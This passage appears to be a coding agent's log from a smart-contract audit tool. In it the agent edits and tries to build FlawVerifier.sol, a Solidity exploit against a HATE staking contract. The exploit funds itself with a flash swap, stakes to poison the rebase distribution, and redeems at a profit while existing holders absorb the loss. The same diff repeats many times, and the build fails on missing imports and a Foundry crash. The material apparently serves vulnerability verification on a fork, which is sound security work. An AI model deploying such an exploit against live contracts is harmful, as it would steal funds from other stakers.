+        (uint256 length,, uint256 end,) = staking.epoch();
+        require(length != 0, "path:zero_epoch_length");
+        require(end <= block.timestamp, "path:not_expired");
+        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
+    }
+
+    function _assertExpiredEpoch(IHATEStaking staking) internal view {
+        (, , uint256 end,) = staking.epoch();
+        require(end <= block.timestamp, "path:not_expired");
+    }
+
+    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
+        (uint256 length,, uint256 end,) = staking.epoch();
+        require(length != 0, "path:zero_epoch_length");
+        require(end <= block.timestamp, "path:no_second_expired_epoch");
+    }
+
+    function _flashFee(uint256 amount) internal pure returns (uint256) {
+        return ((amount * 3) / 997) + 1;
+    }
+
+    function _approveMax(address token, address spender, uint256 minimum) internal {
+        if (IERC20Like(token).allowance(address(this), spender) >= minimum) {
+            return;
+        }
+
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+    }
+
+    function _callOptionalReturn(address token, bytes memory data) internal {
+        (bool ok, bytes memory returndata) = token.call(data);
+        require(ok, "erc20:call_failed");
+        if (returndata.length != 0) {
+            require(abi.decode(returndata, (bool)), "erc20:operation_failed");
+        }
+    }
+}
+
+exec
+/bin/bash -lc "bash -lc 'command -v forge || command -v solc || true'" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+ succeeded in 1277ms:
+/Users/zhanglongqin/.foundry/bin/forge
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+codex
+`forge` is available, so I’m doing a direct build against this case directory to catch any remaining syntax or interface issues before I return the final Solidity.
+exec
+/bin/bash -lc 'forge build --root /Users/zhanglongqin/AuditHoundV2/cases/heavensgate' in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
++        // before the matching `A` sHATE is sent out. That ordering poisons the newly computed
++        // `epoch.distribute` because the principal is counted in HATE backing while the matching
++        // sHATE is still excluded from `circulatingSupply()`.
+         _approveMax(hate, TARGET, amount);
+         staking.stake(address(this), amount);
+ 
++        // Path stage 3:
++        // Let the next rebase execute after the poisoned `epoch.distribute` has been stored, then
++        // redeem the attacker position while existing holders absorb the shortfall. On a fixed fork
++        // we cannot advance time, so this verifier only executes when the system is already at least
++        // one full additional epoch behind and a second rebase is immediately callable.
++        _assertSecondExpiredEpoch(staking);
+         staking.rebase();
+ 
+-        address sHate = staking.sHATE();
+         uint256 sBalance = IERC20Like(sHate).balanceOf(address(this));
+         require(sBalance != 0, "exploit:no_sHATE");
+ 
+@@ -234,9 +242,20 @@
+ 
+     function _checkPathPreconditions(IHATEStaking staking) internal view {
+         (uint256 length,, uint256 end,) = staking.epoch();
++        require(length != 0, "path:zero_epoch_length");
++        require(end <= block.timestamp, "path:not_expired");
++        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++    }
++
++    function _assertExpiredEpoch(IHATEStaking staking) internal view {
++        (, , uint256 end,) = staking.epoch();
+         require(end <= block.timestamp, "path:not_expired");
++    }
++
++    function _assertSecondExpiredEpoch(IHATEStaking staking) internal view {
++        (uint256 length,, uint256 end,) = staking.epoch();
+         require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        require(end <= block.timestamp, "path:no_second_expired_epoch");
+     }
+ 
+     function _flashFee(uint256 amount) internal pure returns (uint256) {
+
+ exited -1 in 3574ms:
+Unable to resolve imports:
+      "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol" in "/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src/onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/Staking.sol"
+      "@openzeppelin/contracts/token/ERC20/IERC20.sol" in "/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src/onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/interface/IsHATE.sol"
+      "@openzeppelin/contracts/access/Ownable.sol" in "/Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src/onchain_auto/0x8ebd6c7d2b79ca4dc5fbdec239a8bb0f214212b8/contracts/Staking.sol"
+with remappings:
+      
+Compiling 3 files with Solc 0.8.19
+installing solc version "0.8.19"
+Compiling 5 files with Solc 0.8.30
+[31mThe application panicked (crashed).[0m
+Message:  [36mAttempted to create a NULL object.[0m
+Location: [35m/Users/runner/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/system-configuration-0.6.1/src/dynamic_store.rs[0m:[35m154[0m
+
+This is a bug. Consider reporting it at https://github.com/foundry-rs/foundry
+
+  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ BACKTRACE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [96m                              ⋮ 7 frames hidden ⋮                               [0m
+   8: [91msystem_configuration::dynamic_store::SCDynamicStoreBuilder<T>::build[0m[90m::hb6b7398ab9127160[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+   9: [91mhyper_util::client::proxy::matcher::mac::with_system[0m[90m::h3338c8c0d2740d7c[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  10: [91mhyper_util::client::proxy::matcher::Builder::from_system[0m[90m::h3a3f53683d31d1e3[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  11: [91mhyper_util::client::proxy::matcher::Matcher::from_system[0m[90m::ha79c82c47b7638ea[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  12: [91mreqwest::async_impl::client::ClientBuilder::build[0m[90m::hc8894a541e69260a[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  13: [91mreqwest::get::{{closure}}[0m[90m::hf2c531c5845e22a4[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  14: [91msvm::install::install::{{closure}}[0m[90m::h4af4aca7a1c58942[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  15: [91mtokio::runtime::park::CachedParkThread::block_on[0m[90m::hf9923e8007f07d0a[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  16: [91mfoundry_compilers::compilers::solc::compiler::Solc::blocking_install[0m[90m::hbad2795c02cfbfcb[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  17: [91m<foundry_compilers::compilers::solc::SolcCompiler as foundry_compilers::compilers::Compiler>::compile[0m[90m::ha950c7a598503643[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  18: [91m<foundry_compilers::compilers::multi::MultiCompiler as foundry_compilers::compilers::Compiler>::compile[0m[90m::h847dd665565acd25[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  19: [91mrayon::iter::plumbing::bridge_producer_consumer::helper[0m[90m::hec0e50d79c64b919[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  20: [91mrayon_core::join::join_context::{{closure}}[0m[90m::hdcb601405dc2a6aa[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  21: [91mrayon::iter::plumbing::bridge_producer_consumer::helper[0m[90m::hec0e50d79c64b919[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  22: [91mrayon_core::thread_pool::ThreadPool::install::{{closure}}[0m[90m::hd0186eb002bb4557[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  23: [91m<rayon_core::job::StackJob<L,F,R> as rayon_core::job::Job>::execute[0m[90m::hf2dbc47692a49700[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  24: [91mrayon_core::registry::WorkerThread::wait_until_cold[0m[90m::h942fce5982a72db3[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  25: [91mrayon_core::registry::ThreadBuilder::run[0m[90m::h4dabfc6399ef1e80[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  26: [32mstd::sys::backtrace::__rust_begin_short_backtrace[0m[90m::ha27942e4919b4798[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  27: [32mcore::ops::function::FnOnce::call_once{{vtable.shim}}[0m[90m::h70ec287184cdfa9b[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  28: [32mstd::sys::pal::unix::thread::Thread::new::thread_start[0m[90m::h4ac2c740e6218e2e[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+  29: [32m__pthread_start[0m[90m<unknown>[0m
+      at [35m<unknown source file>[0m:[35m<unknown line>[0m
+
+Run with COLORBT_SHOW_HIDDEN=1 environment variable to disable frame filtering.
+Run with RUST_BACKTRACE=full to include source snippets.
+
+codex
+The full case build is blocked by unrelated archived `onchain_auto` imports and a local Foundry crash while trying to install another compiler. I’m verifying just `FlawVerifier.sol` in isolation instead of treating that broader build failure as a verifier issue.
+exec
+/bin/bash -lc "bash -lc 'command -v solc && solc --version || true'" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+exec
+/bin/bash -lc "bash -lc 'ls ~/.svm 2>/dev/null; ls ~/.svm/* 2>/dev/null | head'" in /Users/zhanglongqin/AuditHoundV2/cases/heavensgate/src
+ succeeded in 535ms:
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 31a126c96d0fe47d85eab6037fac00a7277572bd..edee7a3f0e166a9bd606d839b3de581acd8a6a79
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.19;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+     function balanceOf(address account) external view returns (uint256);
+@@ -73,7 +73,7 @@
+             uint256 amount = _boundAttackAmount(staking, verifierBalance);
+             require(amount != 0, "direct:no_usable_hate");
+ 
+-            _runExploitWithAmount(staking, hate, amount);
++            _executeExploit(staking, hate, amount);
+ 
+             uint256 endingBalance = IERC20Like(hate).balanceOf(address(this));
+             require(endingBalance > startingBalance, "direct:no_profit");
+@@ -86,7 +86,7 @@
+     }
+ 
+     function initiateFlashSwap(address pair, uint256 amountOut) external {
+-        require(msg.sender == address(this), "self only");
++        require(msg.sender == address(this), "self_only");
+ 
+         address hate = IHATEStaking(TARGET).HATE();
+         address token0 = IUniswapV2PairLike(pair).token0();
+@@ -111,7 +111,7 @@
+         require(received == borrowedAmount, "callback:amount_mismatch");
+ 
+         IHATEStaking staking = IHATEStaking(TARGET);
+-        _runExploitWithAmount(staking, hate, borrowedAmount);
++        _executeExploit(staking, hate, borrowedAmount);
+ 
+         uint256 repayment = borrowedAmount + _flashFee(borrowedAmount);
+         _safeTransfer(hate, pair, repayment);
+@@ -156,9 +156,10 @@
+                     }
+ 
+                     uint256 minRepayment = candidate + _flashFee(candidate);
+-                    uint256 staked = IsHATELike(staking.sHATE()).circulatingSupply();
+-                    uint256 minBonusFloor = staked == 0 ? candidate : (candidate * candidate) / (staked + candidate);
+-                    if (minBonusFloor <= (minRepayment - candidate)) {
++                    uint256 circulating = IsHATELike(staking.sHATE()).circulatingSupply();
++                    uint256 minimumStageThreeGain =
++                        circulating == 0 ? candidate : (candidate * candidate) / (circulating + candidate);
++                    if (minimumStageThreeGain <= (minRepayment - candidate)) {
+                         continue;
+                     }
+ 
+@@ -176,26 +177,33 @@
+         return false;
+     }
+ 
+-    function _runExploitWithAmount(IHATEStaking staking, address hate, uint256 amount) internal {
++    function _executeExploit(IHATEStaking staking, address hate, uint256 amount) internal {
+         require(amount != 0, "exploit:zero_amount");
+ 
+-        // Path stage 1: the fork must already be on or after an expired epoch so that
+-        // `stake()` executes its internal `rebase()` without any off-chain time control.
+-        (uint256 length,, uint256 end,) = staking.epoch();
+-        require(end <= block.timestamp, "path:not_expired");
++        _checkPathPreconditions(staking);
+ 
+-        // Path stage 3 needs the next rebase to execute as part of the same exploit entry.
+-        // That is only possible on a fixed fork if the system is already at least one full
+-        // additional epoch behind after the first `stake()`-triggered rebase.
+-        require(length != 0, "path:zero_epoch_length");
+-        require(block.timestamp >= end + length, "path:no_second_expired_epoch");
++        address sHate = staking.sHATE();
+ 
++        // Path stage 1:
++        // Wait until `epoch.end <= block.timestamp` so `stake()` will execute `rebase()`.
++        _assertExpiredEpoch(staking);
++
++        // Path stage 2:
++        // Call `stake(attacker, A)`, causing `A` HATE to be transferred into the staking contract
